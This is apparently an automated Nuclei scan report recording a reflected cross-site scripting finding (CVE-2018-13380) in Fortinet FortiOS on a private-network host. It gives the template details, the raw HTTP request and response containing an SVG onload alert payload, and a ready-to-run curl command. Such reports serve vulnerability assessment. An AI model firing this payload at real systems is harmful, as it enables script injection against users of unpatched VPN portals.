### Fortinet FortiOS Cross-Site Scripting (CVE-2018-13380) found on http://192.168.198.179:8080/
---
**Details**: **CVE-2018-13380**  matched at http://192.168.198.179:8080/

**Protocol**: HTTP

**Full URL**: http://192.168.198.179:8080/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B

**Timestamp**: Wed Jun 8 20:22:18 +0100 BST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | Fortinet FortiOS Cross-Site Scripting |
| Authors | shelld3v, aaronchen0 |
| Tags | cve, cve2018, fortios, xss, fortinet |
| Severity | medium |
| Description | A Cross-site Scripting (XSS) vulnerability in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.0 to 5.6.7, 5.4.0 to 5.4.12, 5.2 and below versions under SSL VPN web portal allows attacker to execute unauthorized malicious script code via the error or message handling parameters. |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| CWE-ID | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) |
| CVE-ID | [CVE-2018-13380](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-13380) |
| CVSS-Score | 6.10 |

**Request**
```http
GET /message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B HTTP/1.1
Host: 192.168.198.179:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.0 200 OK
Connection: close
Content-Length: 189
Content-Type: text/html

<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/message?title=x&msg=&#<svg/onload=alert(1337)>;</B> was not found.</BODY></HTML>
```

References: 
- https://nvd.nist.gov/vuln/detail/cve-2018-13380
- https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
- https://fortiguard.com/advisory/fg-ir-18-383
- https://fortiguard.com/advisory/fg-ir-20-230

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36' 'http://192.168.198.179:8080/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B'
```
---
Generated by [Nuclei 2.7.1](https://github.com/projectdiscovery/nuclei)